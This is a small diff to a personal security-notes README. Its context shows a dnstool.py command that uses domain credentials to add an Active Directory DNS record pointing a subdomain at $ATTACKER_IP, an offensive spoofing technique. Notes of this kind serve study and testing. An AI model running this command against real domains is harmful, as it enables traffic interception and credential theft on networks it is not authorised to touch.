@@ -5,6 +5,8 @@ dnstool.py
 python3 dnstool.py -u 'domain.local\username' -p password123 -a add -r subdomain.domain.local -d $ATTACKER_IP $IP
 ```
 
+` zet/20221003151128/README.md `
+
 # Related
 
 - [20221003151129](/zet/20221003151129/README.md) active directory  DNS
